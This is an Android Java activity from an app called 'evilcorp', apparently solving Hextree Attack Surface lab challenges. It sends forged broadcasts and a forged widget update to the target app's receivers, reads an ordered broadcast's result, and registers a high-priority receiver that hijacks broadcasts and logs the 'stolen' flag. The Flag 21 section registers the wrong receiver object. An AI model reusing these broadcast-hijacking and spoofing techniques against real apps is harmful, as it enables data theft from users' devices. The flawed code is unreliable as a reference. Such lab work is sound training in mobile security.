package com.example.evilcorp;

import android.annotation.SuppressLint;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.BroadcastReceiver;
import android.content.IntentFilter;
import android.os.Bundle;
import android.util.Log;
import android.widget.Button;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

public class BroadcastReceiversActivity extends AppCompatActivity {

    @SuppressLint({"MissingInflatedId", "UnspecifiedRegisterReceiverFlag"})
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_broadcast_receivers);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });


//        Start activity code

        Button btnToMain = findViewById(R.id.backButtonFromBroadcast);
        btnToMain.setOnClickListener(v -> {
            Intent intent = new Intent(BroadcastReceiversActivity.this, MainActivity.class);
            startActivity(intent);
        });


//        Challenges Code


//Flag 16 code, Send an intent to the broadcast receiver.
        Button flag16Button = findViewById(R.id.flag16Button);
        flag16Button.setOnClickListener(v -> {
            Intent intent = new Intent();
            intent.putExtra("flag", "give-flag-16");
            intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.receivers.Flag16Receiver");
            sendBroadcast(intent);
        });


//        Flag 17 code - Intercept and Redirecting Broadcasts

        Button flag17Button = findViewById(R.id.flag17Button);

        flag17Button.setOnClickListener(v -> {
            Intent intent = new Intent();
            intent.putExtra("flag", "give-flag-17");
            intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.receivers.Flag17Receiver");

            sendOrderedBroadcast(intent, null, new BroadcastReceiver() {
                @Override
                public void onReceive(Context context, Intent intent) {
                    Bundle resultExtras = getResultExtras(true);
                    String resultData = getResultData();
                    if (resultExtras != null) {
                        for (String key : resultExtras.keySet()) {
                            Object value = resultExtras.get(key);
                            Log.i("ResultExtras", "Key: " + key + ", Value: " + value);
                            Toast.makeText(context, value.toString(), Toast.LENGTH_SHORT).show();
                        }
                    } else {
                        Log.i("ResultExtras", "No extras in the result.");
                    }
                    Log.i("Result", "Data: " + resultData);
                }
            }, null, 0, null, null);

        });

//        Flag 18 code - Hijack a broadcast receiver.

        Button flag18Button = findViewById(R.id.flag18Button);
        flag18Button.setOnClickListener(v -> {
            Toast.makeText(this, "Click the corresponding challenge button in Hextree Attack Surface app.", Toast.LENGTH_SHORT).show();
        });
        BroadcastReceiver receiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                String stolen = intent.getStringExtra("flag");
                Log.i("FLAG18", "flag: " + stolen);

                setResultCode(1);
            }
        };

        IntentFilter filter = new IntentFilter("io.hextree.broadcast.FREE_FLAG");
        filter.setPriority(999);
        registerReceiver(receiver, filter);


        //        Flag 19 ... Widget
        // ******* Make sure you've added the app's widget to the Home Screen first

        Button flag19Button = findViewById(R.id.flag19Button);

        flag19Button.setOnClickListener(v -> {
            Intent intent = new Intent();
            intent.setAction("APPWIDGET_UPDATE");
            Bundle bundle = new Bundle();
            bundle.putInt("appWidgetMaxHeight", 1094795585);
            bundle.putInt("appWidgetMinHeight", 322376503);
            intent.putExtra("appWidgetOptions", bundle);
            intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.receivers.Flag19Widget");
            sendBroadcast(intent);
        });

//Flag 20 --- notifications

        Button flag20Button = findViewById(R.id.flag20Button);
        flag20Button.setOnClickListener(v -> {

            Intent intent = new Intent();
            intent.setAction("io.hextree.broadcast.GET_FLAG");
            intent.putExtra("give-flag", true);
            sendBroadcast(intent);

            Toast.makeText(this, "Activate notification first from the app then click again to get the flag", Toast.LENGTH_SHORT).show();


        });


//Flag 21 --- Hijack notifications
            Button flag21Button = findViewById(R.id.flag21Button);
            flag21Button.setOnClickListener(v -> {
                Toast.makeText(this, "Check the corresponding challenge button in the target app", Toast.LENGTH_SHORT).show();
            });
            BroadcastReceiver flag21receiver = new BroadcastReceiver() {
                @Override
                public void onReceive(Context context, Intent intent) {
                    String flag = intent.getStringExtra("flag");
                    Log.d("flag21", flag);

                }
            };
            registerReceiver(receiver, new IntentFilter("io.hextree.broadcast.GIVE_FLAG"));



    }
}

